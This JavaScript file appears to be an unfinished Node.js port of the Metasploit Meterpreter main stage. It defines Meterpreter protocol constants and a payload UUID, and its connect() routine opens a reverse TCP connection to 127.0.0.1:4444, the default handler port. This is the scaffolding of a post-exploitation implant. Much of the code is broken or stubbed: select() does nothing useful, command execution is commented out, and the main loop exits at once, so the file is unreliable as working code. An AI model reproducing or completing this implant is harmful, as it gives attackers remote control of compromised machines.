//GLOBAL VARIABLES ----
var isArray = require('isarray');
var net = require('net')
var readers = [];

console.log("\n[*] Evaling main meterpreter stage");
function my_print(string) {

	console.log("\n[*] "+string);
}

var PAYLOAD_UUID = "\xfe\x8c\x16\xe4\x1c\x6d\xf0\x73\x0b\x3c\x18\x33\x51\x69\x19\xc8";
var SESSION_GUID = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
var AES_256_CBC = 'aes-256-cbc';
var ENC_NONE = 0;
var ENC_AES256 = 1;
var PACKET_TYPE_REQUEST = 0;
var PACKET_TYPE_RESPONSE = 1;
var PACKET_TYPE_PLAIN_REQUEST = 10;
var PACKET_TYPE_PLAIN_RESPONSE = 11;
var ERROR_SUCCESS = 0;
var ERROR_FAILURE = 1;
var CHANNEL_CLASS_BUFFERED = 0;
var CHANNEL_CLASS_STREAM = 1;
var CHANNEL_CLASS_DATAGRAM = 2;
var CHANNEL_CLASS_POOL = 3;
var TLV_META_TYPE_NONE = 0;
var TLV_META_TYPE_STRING = 1 << 16;
var TLV_META_TYPE_UINT = 1 << 17;
var TLV_META_TYPE_RAW = 1 << 18;
var TLV_META_TYPE_BOOL = 1 << 19;
var TLV_META_TYPE_QWORD = 1 << 20;
var TLV_META_TYPE_COMPRESSED = 1 << 29;
var TLV_META_TYPE_GROUP = 1 << 30;
var TLV_META_TYPE_COMPLEX = -(1 << 31);
var TLV_META_TYPE_MASK =  -(1 << 31) + (1 << 30) + (1 << 29) + (1 << 19) + (1 << 18) + (1 << 17) + (1 << 16);
var TLV_RESERVED = 0;
var TLV_EXTENSIONS = 20000;
var TLV_USER = 40000;
var TLV_TEMP = 60000;
var TLV_TYPE_ANY = TLV_META_TYPE_NONE | 0;
var TLV_TYPE_METHOD = TLV_META_TYPE_STRING | 1;
var TLV_TYPE_REQUEST_ID = TLV_META_TYPE_STRING | 2;
var TLV_TYPE_EXCEPTION = TLV_META_TYPE_GROUP | 3;
var TLV_TYPE_RESULT = TLV_META_TYPE_UINT | 4;
var TLV_TYPE_STRING = TLV_META_TYPE_STRING | 10;
var TLV_TYPE_UINT = TLV_META_TYPE_UINT | 11;
var TLV_TYPE_BOOL = TLV_META_TYPE_BOOL | 12;
var TLV_TYPE_LENGTH = TLV_META_TYPE_UINT | 25;
var TLV_TYPE_DATA = TLV_META_TYPE_RAW | 26;
var TLV_TYPE_FLAGS = TLV_META_TYPE_UINT | 27;
var TLV_TYPE_CHANNEL_ID = TLV_META_TYPE_UINT | 50;
var TLV_TYPE_CHANNEL_TYPE = TLV_META_TYPE_STRING | 51;
var TLV_TYPE_CHANNEL_DATA = TLV_META_TYPE_RAW | 52;
var TLV_TYPE_CHANNEL_DATA_GROUP = TLV_META_TYPE_GROUP | 53;
var TLV_TYPE_CHANNEL_CLASS = TLV_META_TYPE_UINT | 54;
var TLV_TYPE_SEEK_WHENCE = TLV_META_TYPE_UINT | 70;
var TLV_TYPE_SEEK_OFFSET = TLV_META_TYPE_UINT | 71;
var TLV_TYPE_SEEK_POS = TLV_META_TYPE_UINT | 72;
var TLV_TYPE_EXCEPTION_CODE = TLV_META_TYPE_UINT | 300;
var TLV_TYPE_EXCEPTION_STRING = TLV_META_TYPE_STRING | 301;
var TLV_TYPE_LIBRARY_PATH = TLV_META_TYPE_STRING | 400;
var TLV_TYPE_TARGET_PATH = TLV_META_TYPE_STRING | 401;
var TLV_TYPE_MACHINE_ID = TLV_META_TYPE_STRING | 460;
var TLV_TYPE_UUID = TLV_META_TYPE_RAW | 461;
var TLV_TYPE_SESSION_GUID = TLV_META_TYPE_RAW | 462;
var TLV_TYPE_RSA_PUB_KEY = TLV_META_TYPE_STRING | 550;
var TLV_TYPE_SYM_KEY_TYPE = TLV_META_TYPE_UINT | 551;
var TLV_TYPE_SYM_KEY = TLV_META_TYPE_RAW | 552;
var TLV_TYPE_ENC_SYM_KEY = TLV_META_TYPE_RAW | 553;

//add_reader function similar to php

function add_reader(resource) {
	
	my_print("Inside add_reader");
	if (typeof(resource) == 'object') {
		readers.push(resource);
	}
	
}

/*
function run_cmd(cmd, args, callBack ) {
    var spawn = require('child_process').spawn;
    var child = spawn(cmd, args);
    var resp = "";

    child.stdout.on('data', function (buffer) { resp += buffer.toString() });
    child.stdout.on('end', function() { callBack (resp) });
}
*/



function select( r, w, e, tv_sec = 0, tv_usec = 0) {
		r='asd';
    streams_r = [];
    streams_w = [];
    streams_e = [];
    sockets_r = [];
    sockets_w = [];
    sockets_e = [];

}


function connect(ipaddr, port) {
    
    my_print( "Inside connect .. ");
    my_print("Doing connect("+ipaddr+","+port+")");
    sock = false;
    proto = 'tcp';
    my_print("("+proto+"://"+ipaddr+":"+port+")");
    var sock = net.connect(port, ipaddr, function() {
    console.log("conn");
		
    });
    sock.on("error", function(error) {
			process.exit()
    });
    my_print("Got a sock: "+sock);
		return sock;
    
}

if (typeof msgsock == "undefined") {
	var ipaddr = '127.0.0.1';
	var port = '4444';
	my_print("Don't have a msgsock, trying to connect ("+ipaddr+","+ port+")");
	socks = connect(ipaddr,port);

}

add_reader(socks);

r = readers;
w = null;
e = null;
t = 1;
console.log("\n\n[+] GETTING INSIDE THE BIG WHILE LOOP .. \n\n");

while (false !== (cnt = select(r, w, e, t))) {
   
	break;
}


